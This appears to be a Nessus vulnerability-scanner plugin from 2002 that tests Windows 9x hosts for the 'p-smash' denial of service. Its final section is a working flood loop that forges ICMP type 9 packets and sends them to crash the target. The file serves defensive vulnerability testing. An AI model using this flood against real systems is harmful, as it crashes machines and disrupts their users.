#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added link to the Microsoft Knowledgebase
#
# GPL
#
# According to "Paulo Ribeiro" <prrar@NITNET.COM.BR> on VULN-DEV,
# Windows 9x cannot handle ICMP type 9 messages.
# This should slow down Windows 95 and crash Windows 98
#

if(description)
{
 script_id(11024);
 script_version ("$Revision: 1.7 $");
 name["english"] = "p-smash DoS (ICMP 9 flood)";
 name["francais"] = "Déni de service p-smash (inondation ICMP 9)";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the remote 
machine by flooding it with ICMP type 9 packets.

A cracker may use this attack to make this
host crash continuously, preventing you
from working properly.


Solution : upgrade your Windows 9x operating system or change it.

Reference : http://support.microsoft.com/default.aspx?scid=KB;en-us;q216141

Risk factor : High";

 desc["francais"] = "Il a été possible de
faire planter la machine distante en l'inondant
de paquets ICMP type 9.

Un pirate peut utiliser ce problème pour tuer 
continuellement cette machine, vous empechant 
de travailler correctement.


Solution : mettez à jour votre système d'exploitation 
Windows 9x ou changez le.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Flood the remote machine with ICMP 9";
 summary["francais"] = "Inonde la machine d'ICMP 9";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
  
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 #family["english"] = "Untested";
 #family["francais"] = "Untested";

 script_family(english:family["english"], francais:family["francais"]);
	       
# script_add_preference(name:"Flood length :", 	type:"entry", value:"5000");	
# script_add_preference(name:"Data length :", 	type:"entry", value:"500");	
 exit(0);
}

#
# The script code starts here
#

start_denial();

fl = script_get_preference("Flood length :");
if (! fl) fl = 5000;
dl = script_get_preference("Data length :");
if (! dl) dl = 500;

src = this_host();
dst = get_host_ip();
id = 804;
s = 0;
d = crap(dl);
for (i = 0; i < fl; i = i + 1)
{
 id = id + 1;
 ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:0,ip_len:20,
                      ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
		      ip_src:this_host());
 icmp = forge_icmp_packet(ip:ip, icmp_type:9, icmp_code:0,
	 		  icmp_seq: s, icmp_id:s, data:d);
 s = s + 1;
 send_packet(icmp, pcap_active: 0);
}

alive = end_denial();
if(!alive){
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}
